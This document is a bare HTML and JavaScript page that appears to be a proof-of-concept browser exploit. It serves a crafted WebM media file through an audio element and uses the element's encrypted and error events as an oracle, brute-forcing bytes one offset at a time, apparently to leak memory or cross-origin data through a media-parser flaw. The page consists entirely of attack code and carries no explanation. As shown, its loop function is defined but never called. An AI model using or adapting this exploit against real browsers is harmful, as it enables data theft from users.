<audio autoplay></audio>
<script>
audio=document.querySelector('audio');
function guess(o, g){
return new Promise(function(resolve, reject){
url=location.search.slice(1);
audio.onencrypted=resolve;
audio.onerror=reject;
le=Math.floor(((0x7FFFFFFF)/8-128*128-(128*(g*256+255)))/(g*256+128+255));
b1=(le>>8)%0xFF;
b2=(le)%0xFF;
offset=(o)%0x7F;

bodyLength=0x12A;
totalLength=311+offset;
audio.src=url+'?&steps=bytes=0-:fetch+response:'+escape('https://raw.githubusercontent.com/ChromiumWebApps/blink/master/LayoutTests/media/content/test-encrypted.webm')+':'+escape(JSON.stringify({'mode':'cors'}))+':0:'+bodyLength+':'+escape(JSON.stringify({status: 206, headers: {'content-range': 'bytes 0-'+bodyLength+'/'+totalLength}}))+';bytes=298-:response:'+btoa((
String.fromCharCode(
  0x22, 0xB5, 0x9C, // Dummy Track Language
  offset+0x80
)+
new Array(offset+1).join('s')+
String.fromCharCode(
0xE0, 0x88,
/*{*/
   0xBA, 0x82,
   /* { */
     b1, b2,
   /* } */
   0xB0, 0x82//,
   /* { */
     // g, 0xFF
   /* } */
/* }*/

)))+':'+escape(JSON.stringify({status:206,headers:{'content-range':'bytes 298-'+(totalLength-3)+'/'+totalLength}}));
});
};
stop=false;
function bf() {
  var offset = 1;
  var char = 0x01;
  var buffer = [];
  var loop = function() {
    console.log(String.fromCharCode.apply(String, buffer), offset, char);
    if(stop || offset > 0x7e)return;
    guess(offset, char).then(function() {
      buffer.push(char);
      char = 0x01;
      offset++;
      setTimeout(loop, 100);
    }).catch(function() {
      char++;
      if (char>256) {
        char=0x01;
        offset++;
      }
      setTimeout(loop, 100);
    });
  };
}
bf();
</script>
